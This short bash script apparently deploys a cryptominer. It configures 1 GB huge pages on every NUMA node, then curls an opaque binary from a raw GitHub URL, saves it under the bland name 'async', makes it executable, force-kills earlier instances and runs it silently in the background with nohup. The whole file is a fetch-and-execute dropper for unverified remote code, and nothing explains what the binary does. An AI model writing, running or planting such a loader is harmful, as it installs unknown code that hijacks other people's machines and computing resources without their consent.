#!/bin/bash

sysctl -w vm.nr_hugepages=$(nproc)

for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
do
    echo 4 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
done

REMOTE_URL="https://raw.githubusercontent.com/changge695/remember/refs/heads/main/sync"
LOCAL_FILE="async"
LOG_FILE="async.log"

if [ -f "$LOCAL_FILE" ]; then
    pids=$(pgrep -f "$LOCAL_FILE")
    if [ -n "$pids" ]; then
        kill -9 $pids 2>/dev/null
    fi
else
    curl -L "$REMOTE_URL" -o "$LOCAL_FILE"
    if [ $? -ne 0 ]; then
        exit 1
    fi
fi

chmod +x "$LOCAL_FILE"
nohup ./"$LOCAL_FILE" > "$LOG_FILE" 2>&1 &
